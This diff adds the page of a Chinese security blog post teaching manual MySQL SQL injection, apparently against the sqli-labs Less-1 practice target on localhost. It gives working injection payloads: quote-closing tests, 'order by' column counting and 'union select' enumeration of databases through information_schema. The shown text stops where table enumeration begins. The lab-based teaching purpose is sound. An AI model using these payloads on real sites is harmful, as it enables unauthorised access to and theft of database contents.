@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200211125934.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200211125934.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"kinghtxg.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"./public/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+  </script>
+
+  <meta name="description" content="上文我们讲到了如何找到注入点，以及一些简单工具的使用，但为了深入理解sql注入的原理、在一些场景能够灵活的进行测试，这一次，我们对手工注入进行简单了解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="3.Mysql手工注入方法">
+<meta property="og:url" content="https://kinghtxg.github.io/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/3.Mysql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="kinght&#39;s blog">
+<meta property="og:description" content="上文我们讲到了如何找到注入点，以及一些简单工具的使用，但为了深入理解sql注入的原理、在一些场景能够灵活的进行测试，这一次，我们对手工注入进行简单了解">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200709175355793.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200711162213303.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200711165855074.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200711170237737.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712100820104.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712101541864.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712101618709.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712104532067.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712105303422.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712105607457.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712105804249.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712110132306.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712110927951.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712114656323.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714002807954.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714003023733.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714003724521.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200705105655813.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714010535076.png">
+<meta property="og:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714012121510.png">
+<meta property="article:published_time" content="2020-07-11T23:49:00.000Z">
+<meta property="article:modified_time" content="2020-09-26T01:07:16.000Z">
+<meta property="article:author" content="kinght">
+<meta property="article:tag" content="web安全、python、安全开发、逆向">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200709175355793.png">
+
+
+<link rel="canonical" href="https://kinghtxg.github.io/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/3.Mysql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/">
+
+
+<script data-pjax class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>3.Mysql手工注入方法 | kinght's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">kinght's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">欢迎大佬光临本博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-导航">
+
+    <a href="http://dh.geekxk.com/" rel="noopener" target="_blank"><i class="fa fa-sitemap fa-fw"></i>导航</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+	  
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84"><span class="nav-number">1.</span> <span class="nav-text">Mysql数据库结构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">Mysql数据库基础结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E5%B1%82"><span class="nav-number">1.1.1.</span> <span class="nav-text">连接层</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E5%B1%82"><span class="nav-number">1.1.2.</span> <span class="nav-text">SQL层</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E5%B1%82"><span class="nav-number">1.1.3.</span> <span class="nav-text">存储引擎层</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql%E7%9A%84%E5%86%85%E7%BD%AE%E5%BA%93"><span class="nav-number">1.2.</span> <span class="nav-text">Mysql的内置库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql"><span class="nav-number">1.2.1.</span> <span class="nav-text">mysql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sys"><span class="nav-number">1.2.2.</span> <span class="nav-text">sys</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#performance-schema"><span class="nav-number">1.2.3.</span> <span class="nav-text">performance_schema</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-schema"><span class="nav-number">1.2.4.</span> <span class="nav-text">information_schema</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E6%8F%90%E7%A4%BA"><span class="nav-number">1.2.5.</span> <span class="nav-text">手工注入方法提示</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">手工基础注入流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95"><span class="nav-number">2.1.</span> <span class="nav-text">注入点测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6"><span class="nav-number">2.2.</span> <span class="nav-text">判断字段长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.3.</span> <span class="nav-text">查询数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="nav-number">2.4.</span> <span class="nav-text">查询数据表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97"><span class="nav-number">2.5.</span> <span class="nav-text">查询列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%86%85%E5%AE%B9"><span class="nav-number">2.6.</span> <span class="nav-text">查询表内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.7.</span> <span class="nav-text">其他的信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E6%A6%82%E8%BF%B0"><span class="nav-number">2.7.1.</span> <span class="nav-text">注入相关函数概述</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.8.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-number">2.8.1.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">2.8.2.</span> <span class="nav-text">写文件</span></a></li></ol></li></ol></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kinght"
+      src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/-4f0ac95857430b53.gif">
+  <p class="site-author-name" itemprop="name">kinght</p>
+  <div class="site-description" itemprop="description">萌新笔记，恳请大佬多多指教</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kinghtxg" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kinghtxg" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:kinght@geekxk.com" title="E-Mail → mailto:kinght@geekxk.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://kinghtxg.github.io/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/3.Mysql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/-4f0ac95857430b53.gif">
+      <meta itemprop="name" content="kinght">
+      <meta itemprop="description" content="萌新笔记，恳请大佬多多指教">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kinght's blog">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          3.Mysql手工注入方法
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-07-12 07:49:00" itemprop="dateCreated datePublished" datetime="2020-07-12T07:49:00+08:00">2020-07-12</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-09-26 09:07:16" itemprop="dateModified" datetime="2020-09-26T09:07:16+08:00">2020-09-26</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>6.4k</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>上文我们讲到了如何找到注入点，以及一些简单工具的使用，但为了深入理解sql注入的原理、在一些场景能够灵活的进行测试，这一次，我们对手工注入进行简单了解</p>
+<a id="more"></a>
+
+<hr>
+<h1 id="Mysql数据库结构"><a href="#Mysql数据库结构" class="headerlink" title="Mysql数据库结构"></a>Mysql数据库结构</h1><h2 id="Mysql数据库基础结构"><a href="#Mysql数据库基础结构" class="headerlink" title="Mysql数据库基础结构"></a>Mysql数据库基础结构</h2><p>主要分为连接层、SQL层、存储引擎层</p>
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200709175355793.png" alt="image-20200709175355793"></p>
+<h3 id="连接层"><a href="#连接层" class="headerlink" title="连接层"></a>连接层</h3><p>定义了数据库库如何与外部程序进行通信，并控制连接数量，验证用户输入</p>
+<p>内容：通信协议、线程、验证</p>
+<h3 id="SQL层"><a href="#SQL层" class="headerlink" title="SQL层"></a>SQL层</h3><p>对于我们而言，重点关注的就是SQL层</p>
+<p>SQL层通过特地给的语法，完成特定任务的执行，将执行的结果进行处理，返回称为人们可以识别的信息</p>
+<p>内容：解析器、查询执行、授权、查询高速缓存、优化器、查询日志信息</p>
+<p>功能：</p>
+<p>1.判断语法、语句、语义</p>
+<p>2.数据库对象授权情况判断，授权失败不继续</p>
+<p>3.解析器：将SQL语句解析成执行计划，运行执行计划，生成找数据的方式</p>
+<p>4.优化器：运行执行计划，基于算法，从执行计划中选择代价最小的交给“执行器”</p>
+<p>5.执行器：运行执行计划，最终生产如何去磁盘找数据方式 </p>
+<p>6.将去数据的方式，交给下层(存储引擎层完成)</p>
+<p>7.最终将取出的数据抽象成管理员或用户能看懂的方式(表)，展示在用户面前</p>
+<p>8.查询缓存:缓存之前查询的数据</p>
+<h3 id="存储引擎层"><a href="#存储引擎层" class="headerlink" title="存储引擎层"></a>存储引擎层</h3><p> 存储引擎层功能主要是实现数据的存取，也定义了数据存取的格式和方式</p>
+<h2 id="Mysql的内置库"><a href="#Mysql的内置库" class="headerlink" title="Mysql的内置库"></a>Mysql的内置库</h2><p>在mysql(版本&gt;=5.7)中内置了一些功能非常强大的库</p>
+<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>保存有账户信息、权限信息、存储过程、event、时区等信息</p>
+<h3 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h3><p>包含了一系列的存储过程、自定义函数以及视窗来帮助我们快速了解系统的元数据信息(元数据是关于数据的数据，如数据库名或者表名，列的数据类型，或访问权限)</p>
+<h3 id="performance-schema"><a href="#performance-schema" class="headerlink" title="performance_schema"></a>performance_schema</h3><p>用于收集数据库服务器性能参数</p>
+<h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>它提供了访问数据库元数据的方式</p>
+<p>其中保存着关于Mysql服务器所维护的所有其他数据库的信息。如数据库名、数据库表、表的数据类型与访问权限等</p>
+<p>information_schema库，功能强大，是进行Mysql注入的基石、可以通过它窥透整个mysql数据库的运行情况和所有的数据信息</p>
+<table>
+<thead>
+<tr>
+<th>功能名称</th>
+<th>查询语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查库</td>
+<td>select schema_name from information_schema.schemata;</td>
+</tr>
+<tr>
+<td>查表</td>
+<td>select table_name from information_schema.tables where table_schema=’库名’;</td>
+</tr>
+<tr>
+<td>查列</td>
+<td>select column_name from information_schema.columns where table_name=’表名’;</td>
+</tr>
+<tr>
+<td>查数据</td>
+<td>select 列名 from 库名.表名;</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>提示：要查询的目标可以使用十六进制进行代替(users字符串转十六进制结果7573657273)</p>
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200711162213303.png" alt="image-20200711162213303"></p>
+</blockquote>
+<h3 id="手工注入方法提示"><a href="#手工注入方法提示" class="headerlink" title="手工注入方法提示"></a>手工注入方法提示</h3><ul>
+<li><p>所有类型的SQL注入，都是基于查库、表、列语句</p>
+</li>
+<li><p>如果数据太多，导致无法返回结果</p>
+<ul>
+<li><p>查询场景：可利用limit(序号,个数)限定返回的数量及位置，依次查询</p>
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200711165855074.png" alt="image-20200711165855074"></p>
+</li>
+<li><p>回显数据场景：<code>*concat*</code>链接多个数据称为一条返回结果</p>
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200711170237737.png" alt="image-20200711170237737"></p>
+</li>
+</ul>
+</li>
+<li><p>在一些场景，想要快速获取数据，可借助工具：burpsuite</p>
+</li>
+</ul>
+<hr>
+<h1 id="手工基础注入流程"><a href="#手工基础注入流程" class="headerlink" title="手工基础注入流程"></a>手工基础注入流程</h1><h2 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>闭合引号，语法报错</p>
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712100820104.png" alt="image-20200712100820104"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>正常显示</p>
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712101541864.png" alt="image-20200712101541864"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;2</span><br></pre></td></tr></table></figure>
+
+<p>不显示内容</p>
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712101618709.png" alt="image-20200712101618709"></p>
+<p>我们基本可以认定这里存在SQL注入漏洞</p>
+<h2 id="判断字段长度"><a href="#判断字段长度" class="headerlink" title="判断字段长度"></a>判断字段长度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 -- #</span><br></pre></td></tr></table></figure>
+
+<p>使用order by排序来猜数据表有多少列，如果order by大于列数，则会报错</p>
+<p>这里3返回正常，4返回如下，说明有3列</p>
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712104532067.png" alt="image-20200712104532067"></p>
+<h2 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h2><p>因为html页面只打印一行的输出，我们要让id不显示结果，所以id要是实际不存在的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3-- #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712105303422.png" alt="image-20200712105303422"></p>
+<p>输出打印了2,3，因为1是id所以不显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select schema_name from information_schema.schemata)-- #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712105607457.png" alt="image-20200712105607457"></p>
+<p>程序返回数据太多</p>
+<p>有两种方法</p>
+<ul>
+<li><p>使用limit限制输出一条一条查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select schema_name from information_schema.schemata limit 0,1)-- #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712105804249.png" alt="image-20200712105804249"></p>
+</li>
+<li><p>使用group_concat把输出结果编程一条语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)-- #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712110132306.png" alt="image-20200712110132306"></p>
+</li>
+</ul>
+<h2 id="查询数据表"><a href="#查询数据表" class="headerlink" title="查询数据表"></a>查询数据表</h2><p>查询数据表名</p>
